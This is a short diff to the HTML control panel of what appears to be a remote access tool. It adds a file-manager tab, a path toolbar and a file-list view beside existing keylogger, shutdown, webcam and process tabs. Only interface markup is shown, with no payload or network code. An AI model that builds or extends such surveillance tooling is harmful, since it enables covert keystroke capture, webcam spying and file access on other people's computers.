@@ -34,6 +34,7 @@
         <div class="tab" data-tab="keylog">⌨️ KEYS</div>
         <div class="tab" data-tab="shutdown">🔌 POWER</div>
         <div class="tab" data-tab="webcam">📹 CAM</div>
+        <div class="tab" data-tab="files">📁 FILES</div>
     </div>
     
     <!-- Main Content -->
@@ -88,6 +89,15 @@
                 <button id="btn-save-video" class="btn-exec">💾 SAVE VID</button>
                 <div class="spacer"></div>
                 <span style="color:#555">[WEBCAM STREAM]</span>
+            </div>
+
+            <!-- Toolbar: File Manager -->
+            <div id="toolbar-files" class="toolbar hidden">
+                <input type="text" id="pathInput" placeholder="Path (ex: C:\)" value="C:\">
+                <button class="btn-exec" id="btn-open-path">📂 OPEN</button>
+                <button class="btn-refresh" id="btn-refresh-files">🔄 Refresh</button>
+                <div class="spacer"></div>
+                <span id="current-path-display" style="color:#555; font-size:14px;">C:\</span>
             </div>
 
             <!-- View: Keylogger -->
@@ -157,6 +167,13 @@
                     </thead>
                     <tbody id="tbody-processes"></tbody>
                 </table>
+            </div>
+
+            <!-- View: File Manager -->
+            <div id="view-files" class="hidden scroll-area">
+                <div id="file-list-container" style="padding: 15px;">
+                    <!-- File list will be dynamically inserted here -->
+                </div>
             </div>
         </div>
 
